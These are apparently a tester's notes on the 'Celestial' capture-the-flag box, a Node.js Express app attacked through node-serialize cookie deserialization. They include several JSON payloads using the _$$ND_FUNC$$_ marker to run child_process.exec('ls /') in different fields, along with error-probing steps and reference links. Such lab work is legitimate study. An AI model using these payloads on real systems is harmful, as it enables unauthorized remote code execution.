# Celestial Notes

## Data 

IP: 
OS:
Hostname:
Machine Purpose: 
Services: Node JS Express
Service Languages: Js
Users:
Credentials:

## Objectives

## Target Map

![](Celestial-map.excalidraw.md)

## Solution Inventory Map


### Todo 

Make Excalidraw

### Done
      


Masscan did not work :/

cookiedummy.png

percent3disequals.png

```json
{"username":"Dummy","country":"Idk Probably Somewhere Dumb","city":"Lametown","num":"2"}

{"username":"FIELD1","country":"FIELD2","city":"FIELD#","num":"FIELD4-NUM"}
// Next break the cookie for enumeration
{"username":","country":"Idk Probably Somewhere Dumb","city":"Lametown","num":"4"} - "
```


expressintheburp.png

archive0.png
and
archive1.png

[Hacktricks Deserialization article](https://book.hacktricks.xyz/pentesting-web/deserialization#nodejs)'s section on Deserialization attacks for [Nodejs](https://nodejs.org/en)

Test to see what is evaluated base on what reflected back to us first - make Node do maths
decodechangeandencodepoc.png

Confirming concatenation of two strings
pocandconfrmingevaluationoftype.png

Next always break for error codes:
```json
{"username":","country":"Idk Probably Somewhere Dumb","city":"Lametown","num":"4"} 
```
 Original for comparison
```json
{"username":"Dummy","country":"Idk Probably Somewhere Dumb","city":"Lametown","num":"2"}
```

![](nodealwayhasverboserrors.png)

We get a username, location that the web is running the npm module from and some directory information. With indication that is serializing with the serialization.js library. [Hacktricks](https://book.hacktricks.xyz/pentesting-web/deserialization#nodejs)
```json
"_$$ND_FUNC$$_function(){ require('child_process').exec('ls /', function(error, stdout, stderr) { console.log(stdout) })}"

{"username":"_$$ND_FUNC$$_function(){ require('child_process').exec('ls /', function(error, stdout, stderr) { console.log(stdout) })}","country":"Idk Probably Somewhere Dumb","city":"Lametown","num":"2"}

// Third Attempt
{"username":"Dummy","country":"_$$ND_FUNC$$_function(){ require('child_process').exec('ls /', function(error, stdout, stderr) { console.log(stdout) })}","city":"Lametown","num":"2"}

// Second Attmept
{"username":"Dummy","country":"Idk Probably Somewhere Dumb","city":"_$$ND_FUNC$$_function(){ require('child_process').exec('ls /', function(error, stdout, stderr) { console.log(stdout) })}","num":"2"}

// First Attempt:
{"username":"Dummy","country":"Idk Probably Somewhere Dumb","city":"Lametown","num":"_$$ND_FUNC$$_function(){ require('child_process').exec('ls /', function(error, stdout, stderr) { console.log(stdout) })}"}
```

First attempt
firstattempt.png

Second attempt
secondattempt.png

[304 - Not Modifed](https://developer.mozilla.org/en-US/docs/Web/HTTP/Status/304) *"client redirection response code indicates that there is no need to retransmit the requested resources. It is an implicit redirection to a cached resource. This happens when the request method is a [safe](https://developer.mozilla.org/en-US/docs/Glossary/Safe/HTTP) method, such as [`GET`](https://developer.mozilla.org/en-US/docs/Web/HTTP/Methods/GET) or [`HEAD`](https://developer.mozilla.org/en-US/docs/Web/HTTP/Methods/HEAD), or when the request is conditional and uses an [`If-None-Match`](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/If-None-Match) or an [`If-Modified-Since`](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/If-Modified-Since) header."*

Third attempt
thirdattempt.png

Forth attempt - Different Error though, but the same as if we broke json
forthattempt.png

```
{"username":_$$ND_FUNC$$_function(){ require('child_process').exec('ls /', function(error, stdout, stderr) { console.log(stdout) })},"country":"Idk Probably Somewhere Dumb","city":"Lametown","num":"2"}

```

Copying and pasting the source code from [here](https://www.npmjs.com/package/node-serialize?activeTab=code)
funcflag.png


funcflagusage.png


line49.png

lines7475.png

Check:
https://github.com/swisskyrepo/PayloadsAllTheThings/blob/f85f2cb4c60c5d4c869794f04c409826dc52ae86/Insecure%20Deserialization/Node.md?plain=1#L1


https://attack.mitre.org/techniques/T1059/007/  [Chaes](https://attack.mitre.org/software/S0631) is a multistage information stealer written in several programming languages that collects login credentials, credit card numbers, and other financial information. Ialso uses NodeJS Puppeer npm package.

https://www.cybereason.com/hubfs/dam/collateral/reports/11-2020-Chaes-e-commerce-malware-research.pdf